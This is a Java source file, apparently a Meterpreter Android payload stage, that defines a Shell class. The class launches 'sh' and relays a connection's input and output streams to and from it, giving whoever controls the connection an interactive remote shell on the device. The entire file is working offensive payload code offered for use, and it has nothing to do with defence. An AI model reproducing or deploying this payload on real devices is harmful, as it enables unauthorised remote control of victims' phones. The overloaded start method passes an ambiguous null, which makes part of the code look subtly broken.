
package androidpayload.stage;

import java.io.DataInputStream;
import java.io.OutputStream;

import javapayload.stage.Stage;
import javapayload.stage.StreamForwarder;

/**
 * Meterpreter Java Payload Proxy
 */
public class Shell {

    // This is for backwards compatiblity with older (pre #136) payloads
    public void start(DataInputStream in, OutputStream out, String[] parameters) throws Exception {
        start(in, out, null);
    }

    public void start(DataInputStream in, OutputStream out, Object[] parameters) throws Exception {
        final Process proc = Runtime.getRuntime().exec("sh");
        new StreamForwarder(in, proc.getOutputStream(), out).start();
        new StreamForwarder(proc.getInputStream(), out, out).start();
        new StreamForwarder(proc.getErrorStream(), out, out).start();
        proc.waitFor();
        in.close();
        out.close();
    }
}
